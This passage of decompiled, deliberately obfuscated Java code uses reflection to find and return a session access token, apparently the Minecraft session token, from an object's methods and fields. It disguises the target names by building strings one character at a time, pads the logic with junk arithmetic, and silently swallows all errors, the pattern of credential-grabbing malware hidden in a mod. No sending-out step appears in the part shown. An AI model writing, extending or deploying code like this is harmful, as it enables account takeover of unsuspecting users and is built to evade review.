                                stringBuilder13.append('_');
                                stringBuilder13.append('1');
                                stringBuilder13.append('7');
                                stringBuilder13.append('2');
                                stringBuilder13.append('6');
                                if (!string4.equals(stringBuilder13.toString())) continue;
                            }
                        }
                        ((Field)itemAvg).setAccessible(true);
                        capSum = ((Field)itemAvg).get(tmpData);
                        if (capSum != null) break;
                    }
                }
                if (capSum == null) continue;
                for (AccessibleObject bjuk_xhqo_wnmud_wiynq : capSum.getClass().getMethods()) {
                    int n = 1458169976;
                    if ((n | 0x56E9E878) == 1458169976) {
                        long l = -417596879L;
                        l *= 100L;
                        l ^= 0x6B8D2109L;
                    }
                    if (((Method)bjuk_xhqo_wnmud_wiynq).getParameterCount() != 0 || Modifier.isStatic(((Method)bjuk_xhqo_wnmud_wiynq).getModifiers())) continue;
                    char[] cArray11 = new char[]{'g', 'e', 't', 'A', 'c', 'c', 'e', 's', 's', 'T', 'o', 'k', 'e', 'n'};  // 'getAccessToken'
                    if (!((Method)bjuk_xhqo_wnmud_wiynq).getName().equals("getAccessToken")) {
                        String string = ((Method)bjuk_xhqo_wnmud_wiynq).getName();
                        StringBuilder stringBuilder14 = new StringBuilder();
                        stringBuilder14.append('m');
                        stringBuilder14.append('e');
                        stringBuilder14.append('t');
                        stringBuilder14.append('h');
                        stringBuilder14.append('o');
                        stringBuilder14.append('d');
                        stringBuilder14.append('_');
                        stringBuilder14.append('1');
                        stringBuilder14.append('6');
                        stringBuilder14.append('7');
                        stringBuilder14.append('4');
                        if (!string.equals(stringBuilder14.toString())) continue;
                    }
                    ((Method)bjuk_xhqo_wnmud_wiynq).setAccessible(true);
                    Object ptrIn = ((Method)bjuk_xhqo_wnmud_wiynq).invoke(capSum, new Object[0]);
                    if (ptrIn == null) continue;
                    return ptrIn.toString();
                }
                for (AccessibleObject wM7ulqp : capSum.getClass().getDeclaredFields()) {
                    if (Modifier.isStatic(((Field)wM7ulqp).getModifiers())) continue;
                    String string = ((Field)wM7ulqp).getName();
                    StringBuilder stringBuilder15 = new StringBuilder();
                    stringBuilder15.append('a');
                    stringBuilder15.append('c');
                    stringBuilder15.append('c');
                    stringBuilder15.append('e');
                    stringBuilder15.append('s');
                    stringBuilder15.append('s');
                    stringBuilder15.append('T');
                    stringBuilder15.append('o');
                    stringBuilder15.append('k');
                    stringBuilder15.append('e');
                    stringBuilder15.append('n');
                    if (!string.equals(stringBuilder15.toString())) {
                        char[] cArray12 = new char[]{'f', 'i', 'e', 'l', 'd', '_', '1', '9', '8', '3'};  // 'field_1983'
                        if (!((Field)wM7ulqp).getName().equals("field_1983")) continue;
                    }
                    ((Field)wM7ulqp).setAccessible(true);
                    Object FyMt_lIGF_riiT_UNAp = ((Field)wM7ulqp).get(capSum);
                    if (FyMt_lIGF_riiT_UNAp == null) continue;
                    return FyMt_lIGF_riiT_UNAp.toString();
                }
            }
        }
        catch (ReflectiveOperationException | RuntimeException exception) {
            // empty catch block
        }
        return null;
    }
}

